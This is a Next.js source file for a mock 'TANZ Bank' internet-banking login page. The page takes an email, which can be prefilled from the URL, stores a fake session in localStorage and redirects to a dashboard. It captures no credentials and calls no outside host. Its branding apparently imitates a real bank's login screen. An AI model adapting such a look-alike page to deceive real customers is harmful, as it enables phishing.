import Image from 'next/image'
import { Inter } from 'next/font/google'
import {useRouter} from "next/router";
import {useEffect, useState} from "react";
import Head from "next/head";
import { v4 } from 'uuid';

export function Header() {
  return (
    <header className="h-14 text-white bg-[#004165]">
      <div className="container mx-auto flex justify-between items-center">
        <div className="flex h-14 text-[#52b3d7] items-center gap-2">
          <div className="text-2xl font-bold text-white uppercase">Bank</div>
          <svg className="h-7 w-7 " width="219" height="219" viewBox="0 0 219 219" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><path d="M104.664 1.41225C106.045 0.491389 107.668 0 109.328 0C110.989 0 112.612 0.491389 113.993 1.41225L214.912 68.6917C215.844 69.2984 216.647 70.084 217.273 71.003C217.9 71.9219 218.338 72.956 218.562 74.0454C218.786 75.1348 218.792 76.2578 218.579 77.3494C218.366 78.4411 217.939 79.4796 217.322 80.405C216.705 81.3304 215.911 82.1243 214.985 82.7406C214.059 83.3569 213.02 83.7835 211.928 83.9956C210.837 84.2077 209.714 84.2012 208.624 83.9763C207.535 83.7515 206.501 83.3129 205.583 82.6858L109.328 18.5124L13.0739 82.6858C11.218 83.8938 8.96051 84.3211 6.7915 83.8749C4.62249 83.4287 2.717 82.145 1.48865 80.3024C0.260302 78.4599 -0.191765 76.2073 0.230577 74.0335C0.65292 71.8597 1.91559 69.9402 3.74449 68.6917L104.664 1.41225Z" fill="currentColor"/><path fillRule="evenodd" clipRule="evenodd" d="M201.838 90.6245V201.837H210.248C212.479 201.837 214.618 202.723 216.195 204.301C217.772 205.878 218.658 208.017 218.658 210.247C218.658 212.478 217.772 214.617 216.195 216.194C214.618 217.771 212.479 218.657 210.248 218.657H8.40993C6.17948 218.657 4.04038 217.771 2.46321 216.194C0.886042 214.617 0 212.478 0 210.247C0 208.017 0.886042 205.878 2.46321 204.301C4.04038 202.723 6.17948 201.837 8.40993 201.837H16.8199V90.6245C16.8225 88.6214 17.54 86.685 18.8433 85.1638C20.1466 83.6426 21.95 82.6366 23.929 82.3267C52.1802 77.9 80.7332 75.6805 109.329 75.6885C138.371 75.6885 166.898 77.9536 194.729 82.3267C196.708 82.6366 198.512 83.6426 199.815 85.1638C201.118 86.685 201.836 88.6214 201.838 90.6245ZM117.739 117.738C117.739 115.508 116.853 113.369 115.276 111.791C113.699 110.214 111.56 109.328 109.329 109.328C107.099 109.328 104.96 110.214 103.382 111.791C101.805 113.369 100.919 115.508 100.919 117.738V193.428C100.919 195.658 101.805 197.797 103.382 199.374C104.96 200.951 107.099 201.837 109.329 201.837C111.56 201.837 113.699 200.951 115.276 199.374C116.853 197.797 117.739 195.658 117.739 193.428V117.738ZM151.379 109.328C153.609 109.328 155.748 110.214 157.325 111.791C158.903 113.369 159.789 115.508 159.789 117.738V193.428C159.789 195.658 158.903 197.797 157.325 199.374C155.748 200.951 153.609 201.837 151.379 201.837C149.148 201.837 147.009 200.951 145.432 199.374C143.855 197.797 142.969 195.658 142.969 193.428V117.738C142.969 115.508 143.855 113.369 145.432 111.791C147.009 110.214 149.148 109.328 151.379 109.328ZM75.6894 117.738C75.6894 115.508 74.8033 113.369 73.2261 111.791C71.649 110.214 69.5099 109.328 67.2794 109.328C65.049 109.328 62.9099 110.214 61.3327 111.791C59.7555 113.369 58.8695 115.508 58.8695 117.738V193.428C58.8695 195.658 59.7555 197.797 61.3327 199.374C62.9099 200.951 65.049 201.837 67.2794 201.837C69.5099 201.837 71.649 200.951 73.2261 199.374C74.8033 197.797 75.6894 195.658 75.6894 193.428V117.738Z" fill="currentColor"/><path d="M109.33 63.0735C112.675 63.0735 115.884 61.7445 118.25 59.3787C120.616 57.013 121.945 53.8043 121.945 50.4586C121.945 47.113 120.616 43.9043 118.25 41.5386C115.884 39.1728 112.675 37.8438 109.33 37.8438C105.984 37.8438 102.775 39.1728 100.41 41.5386C98.0439 43.9043 96.7148 47.113 96.7148 50.4586C96.7148 53.8043 98.0439 57.013 100.41 59.3787C102.775 61.7445 105.984 63.0735 109.33 63.0735Z" fill="currentColor"/></svg>
        </div>
      </div>
    </header>
  )
}

export default function Home() {
  const router = useRouter();
  const [email, setEmail] = useState('');

  useEffect(() => {
    const email = router.query.email;
    if (email) {
      setEmail(email.trim().replace(" ", "+"));
    }
  }, [router.query]);

  function onEmailChange(evt) {
    setEmail(evt.target.value);
  }

  function handleFormSubmit(evt) {
    evt.preventDefault();

    const uuid = v4()
    // set session ID in localstorage for later
    localStorage.setItem('session_id', uuid);
    localStorage.setItem('session', JSON.stringify({
      id: uuid,
      email,
      created_at: new Date().toISOString(),
      state: 'none',
    }));

    router.push('/dashboard');
  }

  return (
    <main className={``}>
      <Head>
        <link rel="icon" type="image/png" href="/tanz-bank.png"/>
        <title>TANZ Bank</title>
      </Head>
      <Header/>

      <div>
        <div className="max-w-4xl mx-auto grid grid-cols-3 gap-8 py-10">
          <div className="col-span-2 border p-14 space-y-10">
            <div>
              <div className="font-semibold text-2xl text-[#004165]">Log in to</div>
              <div className="font-semibold text-2xl text-[#004165]">TANZ Internet Banking</div>
            </div>
            <form onSubmit={handleFormSubmit} className="flex flex-col space-y-8">
              <div className="form-group">
                <label className="login-label block mb-2" htmlFor="">Customer Registration Email</label>
                <input type="email" value={email} onChange={onEmailChange}  className="login-input"/>
              </div>
              <button className="login-btn">Log in</button>
            </form>
          </div>
          <div className="pt-10">
            <h4 className="text-md font-semibold text-[#004165] mb-2">Further information</h4>
            <ul className="leading-7">
              <li><a className="hover:underline text-[#0072ac]" href="#">What’s new</a></li>
              <li><a className="hover:underline text-[#0072ac]" href="#">Find or change your CRN and Password</a></li>
              <li><a className="hover:underline text-[#0072ac]" href="#">View statements</a></li>
              <li><a className="hover:underline text-[#0072ac]" href="#">Get or change your card PIN</a></li>
              <li><a className="hover:underline text-[#0072ac]" href="#">Latest security alerts</a></li>
              <li><a className="hover:underline text-[#0072ac]" href="#">Contact us</a></li>
            </ul>
          </div>
        </div>
      </div>
    </main>
  )
}
